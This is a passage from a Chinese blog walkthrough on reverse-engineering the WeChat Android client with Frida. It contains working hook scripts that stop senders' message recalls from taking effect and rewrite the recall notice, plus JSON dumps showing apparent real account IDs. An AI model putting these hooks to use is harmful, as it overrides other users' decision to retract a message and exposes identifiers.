function_">log</span>(vkP);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对方发送消息 值为1</span></span><br><span class="line"><span class="comment">//对方撤回消息 值为10002</span></span><br></pre></td></tr></table></figure><p>所以猜测根据这个值来判断是否是撤回消息，是否要进入com.tencent.mm.s.b.b进行进一步处理。</p><p>因为要处理防撤回操作，所以进入<code>com.tencent.mm.s.b.b</code></p><p><img src="assets/image-20240611160534331.png" alt="image-20240611160534331"></p><p>这里有个神奇的地方，因为<code>com.tencent.mm.s.b.b</code>方法之后都是处理撤回消息的函数操作，把这里直接返回空是不是就不能执行撤回消息的操作了…</p><p>代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook com.tencent.mm.s.b.b 实现返回空 则不会执行后序的撤回操作</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_bb</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.s.b&quot;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试发现对方确实不能撤回消息了 但是没有撤回提示 xxx撤回一条消息</span></span><br></pre></td></tr></table></figure><p>进入下一个方法看看</p><p><code>com.tencent.mm.model.ch.b</code></p><p><img src="assets/image-20240611161159927.png" alt="image-20240611161159927"></p><p>发现这里又对vkP进行了switch判断，vkP==10002,所以这里主要执行case 10002；</p><p><img src="assets/image-20240611162654619.png" alt="image-20240611162654619"></p><p>发现主要是对a2内容进行判断操作。a2=cvVar.GYI.IYz，这里就json化输出cvVar.GYI，然后cvVar.GYI作为参数调用了这个方法</p><p><img src="assets/image-20240611164521216.png" alt="image-20240611164521216"></p><p>可以打印一下deoVar.ITz看看内容，因为case 10002都是对其内容进行判断操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改撤回提示消息 打印json输出</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_msg</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> v0 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>].<span class="property">gpg</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(gson.$new().<span class="title function_">toJson</span>(v0)); <span class="comment">//json化输出 GYI</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> revoke_xml_obj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(v0.<span class="property">GYI</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.deo&quot;</span>));</span><br><span class="line">  </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;6 ch.b()&quot;</span>, log_str);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印内容如下：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;CreateTime&quot;</span>:<span class="number">1718094764</span>,</span><br><span class="line"><span class="string">&quot;GYG&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYH&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_5yg9b4aw7fo422&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYI&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003csysmsg type<span class="char escape_">\u</span>003d<span class="char escape_">\&quot;</span>revokemsg<span class="char escape_">\&quot;</span><span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003crevokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003csession<span class="char escape_">\u</span>003ewxid_0wk809ov49tq22<span class="char escape_">\u</span>003c/session<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cmsgid<span class="char escape_">\u</span>003e1632163924<span class="char escape_">\u</span>003c/msgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cnewmsgid<span class="char escape_">\u</span>003e5211977936516039943<span class="char escape_">\u</span>003c/newmsgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003creplacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c![CDATA[<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> 撤回了一条消息]]<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/replacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/revokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/sysmsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYJ&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;GYK&quot;</span>:&#123;<span class="string">&quot;hasBuffer&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hasILen&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;iLen&quot;</span>:<span class="number">0</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYL&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003cmsgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003ctmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cpublisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/publisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/tmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/msgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;GYN&quot;</span>:<span class="number">801938977</span>,</span><br><span class="line"><span class="string">&quot;nNf&quot;</span>:<span class="number">3</span>,</span><br><span class="line"><span class="string">&quot;vkP&quot;</span>:<span class="number">10002</span>,</span><br><span class="line"><span class="string">&quot;ysP&quot;</span>:<span class="number">1632163925</span>,</span><br><span class="line"><span class="string">&quot;ysR&quot;</span>:<span class="number">679760550</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>:[],<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">//</span>IYz内容</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>sysmsg type<span class="operator">=</span><span class="string">&quot;revokemsg&quot;</span><span class="operator">&gt;</span></span><br><span class="line">        <span class="symbol">&lt;revokemsg&gt;</span></span><br><span class="line">                <span class="symbol">&lt;session&gt;</span>wxid_0wk809ov49tq22<span class="operator">&lt;</span><span class="operator">/</span>session<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;msgid&gt;</span><span class="number">1632163924</span><span class="operator">&lt;</span><span class="operator">/</span>msgid<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;newmsgid&gt;</span><span class="number">5211977936516039943</span><span class="operator">&lt;</span><span class="operator">/</span>newmsgid<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;replacemsg&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>[CDATA[<span class="string">&quot;G08aT&quot;</span> 撤回了一条消息]]<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>replacemsg<span class="operator">&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span><span class="operator">/</span>revokemsg<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>sysmsg<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>这里就可以修改一下撤回消息提示的提示内容，把<replacemsg>内容替换一下</p><p>代码如下</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_msg</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> v0 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>].<span class="property">gpg</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>));</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">function</span> <span class="title function_">modify_revoke_str</span>(<span class="params">old_revoke_str</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> message = <span class="string">&quot;尝试撤回了一条消息&quot;</span>;  <span class="comment">//要替换的内容</span></span><br><span class="line">                <span class="keyword">var</span> revoke_msg = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(message);</span><br><span class="line">                <span class="keyword">var</span> sub_str = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;]]&gt;&lt;/replacemsg&gt;&quot;</span>)</span><br><span class="line">                <span class="keyword">var</span> index = old_revoke_str.<span class="title function_">indexOf</span>(sub_str);</span><br><span class="line">                <span class="keyword">var</span> new_revoke_str = old_revoke_str.<span class="title function_">substring</span>(<span class="number">0</span>, index - <span class="number">7</span>) + revoke_msg + old_revoke_str.<span class="title function_">substring</span>(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(new_revoke_str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> revoke_xml_obj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(v0.<span class="property">GYI</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.deo&quot;</span>));</span><br><span class="line">    </span><br><span class="line">            revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span> = <span class="title function_">modify_revoke_str</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手机上撤回提示也确实被修改</p><p><img src="assets/image-20240611165936122.png" alt="image-20240611165936122"></p><p>因为聊天界面发生了改变，所以这里又回到了hook notifyDataSetChanged，json打印最后消息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">notifyDataSetChanged_json</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.a.a&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">notifyDataSetChanged</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;notifyDataSetChanged&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="property">LtF</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="comment">//console.log(&quot;Ltf&quot;,data);</span></span><br><span class="line">            <span class="keyword">var</span> data_size = data.<span class="title function_">size</span>();</span><br><span class="line">            <span class="comment">//console.log(&quot;data_size&quot;,data_size);</span></span><br><span class="line">            <span class="keyword">var</span> last_msg=<span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(data_size-<span class="number">1</span>),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(gson.$new().<span class="title function_">toJson</span>(last_msg));</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">notifyDataSetChanged</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现撤回消息与撤回提示，仅有<code>field_content&quot;</code>、<code>&quot;field_type&quot;</code>、<code>&quot;exe&quot;</code>字段不一样，其中正常消息的<code>field_type=1,exe=true</code>；撤回提示<code>field_type=10000,exe=false</code></p><p>被撤回消息和撤回消息的提示的<code>field_msgSvrId</code>字段是一样的，同时对应着撤回提示xml的<code>&lt;newmsgid&gt;</code>字段</p><p>尝试修改撤回提示的<code>&lt;newmsgid&gt;</code>字段，发现没有什么用。直接就变成不撤回了。</p><p>分析下一个方法：</p><p><code>com.tencent.mm.model.f.a</code>,跟进</p><p><img src="assets/image-20240611185630564.png" alt="image-20240611185630564"></p><p><img src="assets/image-20240611190920135.png" alt="image-20240611190920135"></p><p>参数一为字符串String，通过翻阅知道是 str = M.get(“.sysmsg.$type”)</p><ul><li>即获取的是xml中<code>sysmsg</code>的<code>type</code>属性</li><li>撤回消息就为<code>&quot;revokemsg&quot;</code></li></ul><p>参数二是一个XML内容转成的Map数组</p><p>参数三保存着原始的所有数据</p><p>打印参数代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_fa</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&#x27;/data/local/tmp/r0gson.dex&#x27;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.r0ysue.gson.Gson&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.model.f&quot;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[0]:&quot;</span>+<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[1]:&quot;</span>+gson.$new().<span class="title function_">toJson</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>]));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===============&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[2]:&quot;</span>+gson.$new().<span class="title function_">toJson</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>]));</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数如下</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">arguments[<span class="number">0</span>]:revokemsg  <span class="operator">//</span>撤回消息 类型就是revokemsg</span><br><span class="line"></span><br><span class="line">arguments[<span class="number">1</span>]:&#123;<span class="string">&quot;</span></span><br><span class="line"><span class="string">.sysmsg.revokemsg.newmsgid&quot;</span>:<span class="string">&quot;7006750091473010700&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\n</span><span class="char escape_">\t</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.session&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.$type&quot;</span>:<span class="string">&quot;revokemsg&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.replacemsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> 撤回了一条消息&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.msgid&quot;</span>:<span class="string">&quot;1632163930&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">arguments[<span class="number">2</span>]:&#123;</span><br><span class="line"><span class="string">&quot;gpg&quot;</span>:&#123;<span class="string">&quot;CreateTime&quot;</span>:<span class="number">1718103677</span>,</span><br><span class="line"><span class="string">&quot;GYG&quot;</span>:                        &#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;GYH&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_5yg9b4aw7fo422&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;GYI&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003csysmsg type<span class="char escape_">\u</span>003d<span class="char escape_">\&quot;</span>revokemsg<span class="char escape_">\&quot;</span><span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003crevokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003csession<span class="char escape_">\u</span>003ewxid_0wk809ov49tq22<span class="char escape_">\u</span>003c/session<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cmsgid<span class="char escape_">\u</span>003e1632163930<span class="char escape_">\u</span>003c/msgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cnewmsgid<span class="char escape_">\u</span>003e7006750091473010700<span class="char escape_">\u</span>003c/newmsgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003creplacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c![CDATA[<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> 撤回了一条消息]]<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/replacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/revokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/sysmsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYJ&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;GYK&quot;</span>:&#123;<span class="string">&quot;hasBuffer&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hasILen&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;iLen&quot;</span>:<span class="number">0</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,<span class="string">&quot;GYL&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003cmsgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003ctmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cpublisher-id<span class="char escape_">\u</span>003e<span class="char 